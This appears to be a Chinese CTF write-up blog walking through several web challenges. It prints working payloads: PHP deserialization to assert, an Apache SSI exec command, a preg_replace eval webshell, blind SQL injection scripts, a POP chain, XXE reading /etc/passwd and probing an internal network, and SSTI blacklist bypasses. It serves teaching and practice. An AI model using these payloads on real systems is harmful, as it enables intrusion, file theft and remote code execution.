<h3 id="反序列化-php函数拼接"><a href="#反序列化-php函数拼接" class="headerlink" title="反序列化+php函数拼接"></a>反序列化+php函数拼接</h3><p>题目给出代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>; <span class="comment">//参数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>; <span class="comment">//data函数名</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>); <span class="comment">//拼接构造 =&gt; data(Y-m-d h:i:s)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); <span class="comment">//反序列化</span></span><br></pre></td></tr></table></figure>
<p>查了好久怎么绕__construct，结果最后发现其实根本不需要绕_(¦3」∠)_</p>
<p>构造payload试试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现没啥用，应该是system被ban了，试试assert</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功进到了phpinfo()，然后直接查找flag就可以了</p>
<p>最后得到flag</p>
<blockquote>
<p> flag{63ff34b3-4698-48c7-8d82-19be438a88f3}</p>
</blockquote>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>试了试啥东西都没找到，最后试试扫目录，最后拿到个<code>index.php.swp</code></p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure>
<p>这里我们知道需要得到一个password是md5编码后的前六位与admin参数值相等才能进去if</p>
<p>用脚本跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    md5 = hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    md6 = md5[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> md6 == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>得到一串密码<code>2020666</code>，成功登入</p>
<p>但是啥都没有，查看http协议头</p>
<p>发现一个<code>Url_is_here: public/5c1e27af103c53033f640c42098db9a537470926.shtml</code></p>
<p>这里通过之前的代码我们可以知道这一串是随机生成的hash作为文件名，然后把密码啊存进去</p>
<h3 id="Apache-SSI远程命令执行"><a href="#Apache-SSI远程命令执行" class="headerlink" title="Apache SSI远程命令执行"></a>Apache SSI远程命令执行</h3><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">原理在这</a>，重新输入一下username进行命令执行</p>
<blockquote>
<p>username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->&amp;password=2020666</p>
</blockquote>
<p>得到flag</p>
<blockquote>
<p> flag{555f614a-6cb7-4175-be3c-8cf0205ace8d}</p>
</blockquote>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="伪协议传输流截取"><a href="#伪协议传输流截取" class="headerlink" title="伪协议传输流截取"></a>伪协议传输流截取</h3><p>代码审计是要绕过一个if</p>
<blockquote>
<p>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”I have a dream”))</p>
</blockquote>
<p>用伪协议来截取一下传输流</p>
<blockquote>
<p>text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</p>
</blockquote>
<p>然后需要拿到next.php，继续用伪协议</p>
<blockquote>
<p>text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</p>
</blockquote>
<p>然后base64解码，得到一串源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里下面那两个函数都没啥用，我们直接看上面的complex函数</p>
<h3 id="preg-replace命令执行"><a href="#preg-replace命令执行" class="headerlink" title="preg_replace命令执行"></a>preg_replace命令执行</h3><p><a href="https://xz.aliyun.com/t/2557">原理在这</a>，构造paoload</p>
<blockquote>
<p>?\S*={${phpinfo()}}</p>
</blockquote>
<p>成功执行了phpinfo()函数，构造一个马进去</p>
<blockquote>
<p>?\S*=${eval($_POST[cmd])}</p>
</blockquote>
<p>然后命令注入</p>
<blockquote>
<p>cmd=system(‘cat /flag’);</p>
</blockquote>
<p>得到flag</p>
<blockquote>
<p>flag{73039dca-6653-471d-ac00-e08082493c44}</p>
</blockquote>
<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>SQL盲注，不多说，直接上脚本</p>
<p>爆表名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>爆列名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>爆数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://913ec15c-c8c0-471b-a52a-b9284ba0af77.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">        sql = <span class="string">f&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        result = requests.get(url + sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="comment"># print(f&quot;left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;result now is: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<blockquote>
<p>flag{c3b4b1f9-2515-4cf0-af08-2ca189dc3f38}</p>
</blockquote>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h3 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h3><p>题目给出了很长的一串php代码，可以看出是一道反序列化题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 题目中出现的反序列化方法</span></span><br><span class="line">__construct   当一个对象创建时被调用，</span><br><span class="line">__toString   当一个对象被当作一个字符串被调用。</span><br><span class="line">__wakeup()   使用unserialize时触发</span><br><span class="line">__get()    用于从不可访问的属性读取数据</span><br><span class="line"><span class="comment">// 难以访问包括：（1）私有属性，（2）没有初始化的属性</span></span><br><span class="line">__invoke()   当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
<p>我们看一下代码，先看看第一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); <span class="comment">// include函数包含文件，这里应该是拿flag的地方，并且题目已经给出了flag在flag.php中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">// __invoke魔术方法，具体看上面</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123; <span class="comment">// __construct魔术方法，创建类时自动调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">// __toString魔术方法，上面的echo 把source对象当作字符串调用了，于是会触发这个魔术方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source; <span class="comment">// 访问了$str里的source</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 调用unserialize函数时自动触发</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123; <span class="comment">// 这里过滤了一些东西，但是没有过滤filter伪协议</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// __get魔术方法，具体看上面</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>(); <span class="comment">// 这里很显然的可以用来调用第一个类中的__invoke魔术方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当第二个里的<code>$str=new Test()</code>，而Test类中又没有source，于是可以触发__get()魔术方法，然后我们只需要使<code>$p=new Modifier()</code>，就又可以触发__invoke()魔术方法，最后我们只要使Modifier里的var为我们要读取的flag.php即可。</p>
<p>所以payload可以为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<p>最后即可得到flag，算是一道入门的php链题吧</p>
<blockquote>
<p>flag{3beb1994-1149-438c-847e-9c5315aba30b}</p>
</blockquote>
<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>这题跟之前的那道XXE题目差不多，但是后面获取flag的姿势换了</p>
<h3 id="XXE打内网"><a href="#XXE打内网" class="headerlink" title="XXE打内网"></a>XXE打内网</h3><p>先看看/etc/passwd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以进去，去看看/flag能不能拿到东西</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果出现报错了，应该是没有flag这个文件</p>
<p>这里看了看别人的WP，学到了一些新东西，XXE可以直接查看内网</p>
<p>核心文件是<code>/etc/hosts</code>和<code>/proc/net/arp</code>，用来查看内网存活的主机IP</p>
<p>只有<code>/proc/net/arp</code>有出现内网IP，直接读取看看</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://10.0.96.2&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有啥有用的回显，直接爆ip的c段</p>
<p><img src="https://i.loli.net/2021/04/24/d1XVvrb5qakgt4h.png"></p>
<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>在解密界面输入一些随机字符串，出现了报错回显，显示出了一部分源代码</p>
<p>发现可以SSTI，而且有个waf过滤了一些东西，直接查看源代码看看waf里有什么</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>拿到waf的源代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>虽然过滤了一些东西，但是还是可以用字符串拼接来进行注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>拿到目录，看见个<code>this_is_the_flag.txt</code>，但是flag被过滤了</p>
<p>所以可以这样子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>拿到flag</p>
<blockquote>
<p>flag{2f47beb4-67e1-40f4-b9f3-444d0003f7b7}</p>
</blockquote>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目提示说要买到lv6，整个脚本跑一下</p>
